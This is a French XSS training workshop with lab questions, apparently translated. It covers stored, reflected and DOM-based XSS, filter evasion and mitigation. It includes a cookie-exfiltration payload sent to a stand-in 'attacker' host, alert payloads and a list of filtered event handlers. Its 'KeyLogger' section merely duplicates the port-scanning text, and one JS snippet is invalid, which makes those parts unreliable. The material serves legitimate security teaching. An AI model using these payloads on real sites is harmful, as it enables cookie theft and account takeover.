# Cross-Site Scripting

Les scripts intersites (XSS) sont une vulnérabilité de sécurité que l'on trouve généralement dans les applications Web. C'est un type d'injection qui peut permettre à un attaquant d'exécuter des scripts malveillants et de les faire exécuter sur la machine de la victime.

Une application Web est vulnérable au XSS si elle utilise une entrée utilisateur non vérifiée. XSS est possible en Javascript, VBScript, Flash et CSS.

L'étendue de la gravité de cette vulnérabilité dépend du type de XSS, qui est normalement divisé en deux catégories : persistant/stocké et reflété. En fonction de laquelle, les attaques suivantes sont possibles :

- **Vol de cookie** - Voler votre cookie à partir d'une session authentifiée, permettant à un attaquant de se connecter en tant que vous sans avoir à fournir lui-même une authentification.

- **Keylogging** - Un attaquant peut enregistrer un écouteur d'événement clavier et envoyer toutes vos frappes à son propre serveur.

- **Instantané de webcam** - En utilisant les capacités HTML5, il est même possible de prendre des instantanés à partir d'une webcam d'ordinateur compromise.

- **Phishing** - Un attaquant pourrait soit insérer de faux formulaires de connexion dans la page, soit vous rediriger vers un clone d'un site vous incitant à révéler vos données sensibles.

- **Balayage des ports** - Vous avez bien lu. Vous pouvez utiliser le XSS stocké pour analyser un réseau interne et identifier d'autres hôtes sur leur réseau.

- **Autres exploits basés sur le navigateur** - Il existe des millions de possibilités avec XSS.

Qui saurait que tout cela était possible en visitant simplement une page Web. 
Certaines mesures sont mises en place pour empêcher que cela ne se produise, par votre navigateur et votre antivirus.


Ce workshop expliquera les différents types de scripts intersites, les attaques et vous obligera à résoudre des défis en cours de route.

---

# Stored XSS

Les scripts intersites stockés sont le type de XSS le plus dangereux. C'est là qu'une chaîne malveillante provient de la base de données des sites Web. Cela se produit souvent lorsqu'un site Web autorise une entrée utilisateur qui n'est pas nettoyée (supprimer les "mauvaises parties" d'une entrée utilisateur) lorsqu'elle est insérée dans la base de données.

**Un exemple :**

Un attaquant crée un payload dans un champ lors de l'inscription à un site Web stocké dans la base de données des sites Web. Si le site Web ne nettoie pas correctement ce champ, lorsque le site affiche ce champ sur la page, il exécutera le payload pour tous ceux qui le visitent.

Le payload pourrait être aussi simple que ```<script>alert(1)</script>```

Cependant, ce payload ne s'exécutera pas uniquement dans votre navigateur, mais dans tout autre navigateur affichant les données malveillantes insérées dans la base de données.

Expérimentons en exploitant ce type de XSS. accédez à la page "Stored-XSS" sur le terrain de jeu XSS.

**Répondre aux questions ci-dessous**

La machine que vous avez déployée plus tôt vous guidera tout en exploitant certaines vulnérabilités intéressantes que le XSS stocké a à offrir. Il y a des astuces pour répondre à ces questions sur la machine.

Ajoutez un commentaire et voyez si vous pouvez insérer votre propre code HTML.
Cela révélera la réponse à cette question.
```
reponse
```
Créez une popup d'alerte apparaissant sur la page avec vos cookies de document.
```
reponse
```
Remplacez "XSS Playground" par "I am a hacker" en ajoutant des commentaires et en utilisant Javascript.
```
reponse
```
sites Web_can_be_easily_defaced_with_xss
Le XSS stocké peut être utilisé pour voler un cookie de victime (données sur une machine qui authentifie un utilisateur sur un serveur Web). Cela peut être fait en demandant au navigateur des victimes d'analyser le code Javascript suivant :

<script>window.location='http://attacker/?cookie='+document.cookie</script>

Ce script navigue dans le navigateur de l'utilisateur vers une URL différente, cette nouvelle demande inclura un cookie de victime en tant que paramètre de requête. Lorsque l'attaquant a acquis le cookie, il peut l'utiliser pour usurper l'identité de la victime.

Prenez le contrôle du compte de Jack en volant son cookie, 
quelle était la valeur de son cookie ?
```
reponse
```
Publiez un commentaire en tant que Jack.
```
reponse
```

---
  
### Reflected XSS

Dans une attaque de script inter-sites réfléchie, la charge utile malveillante fait partie de la demande des victimes au site Web. Le site Web inclut cette charge utile en réponse à l'utilisateur. En résumé, un attaquant doit inciter une victime à cliquer sur une URL pour exécuter sa charge utile malveillante.

Cela peut sembler inoffensif car cela nécessite que la victime envoie une demande contenant une charge utile d'attaquants, et un utilisateur ne s'attaquerait pas. Cependant, les attaquants pourraient amener l'utilisateur à cliquer sur son lien conçu qui contient sa charge utile via l'ingénierie sociale par e-mail.

Le XSS réfléchi est le type d'attaque XSS le plus courant.

**Un exemple**

Un attaquant crée une URL contenant une charge utile malveillante et l'envoie à la victime. La victime est trompée par l'attaquant en cliquant sur l'URL. La requête peut être http://example.com/search?keyword=<script>...</script>

Le site Web inclut ensuite cette charge utile malveillante de la demande dans la réponse à l'utilisateur. Le navigateur des victimes exécutera la charge utile dans la réponse. Les données recueillies par le script sont ensuite renvoyées à l'attaquant (elles ne sont pas nécessairement envoyées par la victime, mais vers un autre site Web où l'attaquant recueille ensuite ces données - cela empêche l'attaquant de recevoir directement les données de la victime).

Répondre aux questions ci-dessous
Créez un payload XSS réfléchie qui provoquera une fenêtre contextuelle disant "Hello"
```
reponse
```
Créez une charge utile XSS réfléchie qui provoquera une fenêtre contextuelle avec l'adresse IP de votre machine
```
reponse
```
---

# DOM Based Attacks

**Qu'est-ce que le DOM**
Dans une attaque XSS basée sur DOM, une charge utile malveillante n'est pas réellement analysée par le navigateur de la victime jusqu'à ce que le JavaScript légitime du site Web soit exécuté. Qu'est-ce que cela signifie?

Avec le xss reflexif, une charge utile d'attaquant sera injectée directement sur le site Web et n'aura pas d'importance lorsque d'autres Javascript sur le site seront chargés.

<html>
     Vous avez recherché <em><script>...</script></em>
</html

Avec le xss basé sur DOM, une charge utile d'attaquant ne sera exécutée que lorsque le code Javascript vulnérable est chargé ou interagi. Il passe par une fonction Javascript comme ceci :

```var mot-clé = document.querySelector('#search')```
```keyword.innerHTML = <script>...</script>```

**Répondre aux questions ci-dessous**
  
Regardez le code source de la page XSS basée sur le DOM des machines déployées et trouvez un moyen de l'exploiter en exécutant une alerte avec vos cookies.
```
réponse : 
```
Créez un événement onhover sur une balise d'image, qui change la couleur d'arrière-plan du site Web en rouge.
```
réponse : 
```
  
---
  
# XSS Pour Scanner les ports
  
Les XSS peuvent être utilisés pour toutes sortes de méfaits, l'un étant la possibilité d'analyser un réseau interne de victimes et de rechercher des ports ouverts. Si un attaquant s'intéresse aux autres appareils connectés sur le réseau, il peut utiliser Javascript pour envoyer des requêtes à une plage d'adresses IP et déterminer laquelle répond.

Sur le XSS Playground, accédez à l'onglet Analyse IP/Port et passez en revue un script pour analyser le réseau interne.

**Répondre aux questions ci-dessous**
  
Comprendre le script de base du POC.

**Optionnel** : Créez ensuite un fichier sur votre ordinateur avec le script, modifiez-le en fonction de votre réseau et exécutez-le. Voyez s'il récupère l'un de vos appareils sur lesquels un serveur Web est en cours d'exécution.

---
  
# KeyLogger avec XSS

Les scripts intersites peuvent être utilisés pour toutes sortes de méfaits, l'un étant la possibilité d'analyser un réseau interne de victimes et de rechercher des ports ouverts. Si un attaquant s'intéresse aux autres appareils connectés sur le réseau, il peut utiliser Javascript pour envoyer des requêtes à une plage d'adresses IP et déterminer laquelle répond.

Sur le XSS Playground, accédez à l'onglet Analyse IP/Port et passez en revue un script pour analyser le réseau interne.

**Répondre aux questions ci-dessous**
  
Comprendre le script de base de la preuve de concept.

**Optionnel** : Créez ensuite un fichier sur votre ordinateur avec le script, modifiez-le en fonction de votre réseau et exécutez-le. Voyez s'il récupère l'un de vos appareils sur lesquels un serveur Web est en cours d'exécution.
  
---

# Contournement de filtres (Evasion)

  Il existe de nombreuses techniques utilisées pour filtrer les charges utiles malveillantes utilisées avec les scripts intersites. Ce sera votre travail de contourner 4 filtres couramment utilisés.

Accédez à "Filter Evasion" dans XSS Playground pour commencer.

Les scripts intersites sont extrêmement courants. Vous trouverez ci-dessous quelques rapports de XSS trouvés dans des applications massives ; vous pouvez être très bien payé pour trouver et signaler ces vulnérabilités.

XSS trouvé dans Shopify
7 500 $ pour XSS trouvé dans le chat Steam
2 500 $ pour XSS dans HackerOne
XSS trouvé sur Instagram
Répondre aux questions ci-dessous

Ignorez le filtre qui supprime toutes les balises de script.

Le mot alerte est filtré, contournez-le.
```
reponse
```  
Le mot bonjour est filtré, contournez-le.
  ```
reponse
```
Le filtrage dans le défi 4 est le suivant :
Hello   
script  
onerror  
onsubmit  
onload  
onmouseover  
onfocus  
onmouseout  
onkeypress   
onchange   
```
reponse
```
  
---

# Mitigation 
  
**Méthodes de protection**

Il existe de nombreuses façons d'empêcher XSS, voici les 3 façons de continuer à utiliser des scripts intersites pour votre application.

**Escaping** - Sanitizer toutes les entrées de l'utilisateur. Cela signifie que toutes les données que votre application a reçues sont sécurisées avant de les rendre à vos utilisateurs finaux. En échappant à l'entrée de l'utilisateur, les caractères clés des données reçues, mais la page Web ne pourront pas être interprétées de manière malveillante. Par exemple, vous pouvez interdire le rendu des caractères < et >.
Plus d'infos : https://findanyanswer.com/what-is-escaping-user-input

**Validation de l'entrée** - Il s'agit du processus permettant de s'assurer que votre application restitue les données correctes et empêche les données malveillantes de nuire à votre site, à votre base de données et à vos utilisateurs. La validation d'entrée interdit la soumission de certains caractères en premier lieu.

**Désinfection** - Enfin, la désinfection des données est une défense solide, mais ne doit pas être utilisée seule pour lutter contre les attaques XSS. L'assainissement des entrées utilisateur est particulièrement utile sur les sites qui autorisent le balisage HTML, en changeant l'entrée utilisateur inacceptable dans un format acceptable. Par exemple, vous pouvez nettoyer le caractère < dans l'entité HTML &#60;
Autres exploits

XSS est souvent négligé, mais peut avoir autant d'impact que d'autres vulnérabilités à fort impact. Le plus souvent, il s'agit d'enchaîner plusieurs vulnérabilités pour produire un exploit plus grand/meilleur. Vous trouverez ci-dessous d'autres outils et sites Web intéressants liés au XSS.

BeEF est un outil de test d'intrusion qui se concentre sur le navigateur Web. Le concept ici est que vous « accrochez » un navigateur (à l'aide de XSS), puis vous pouvez lancer et contrôler une gamme d'attaques différentes.  
  
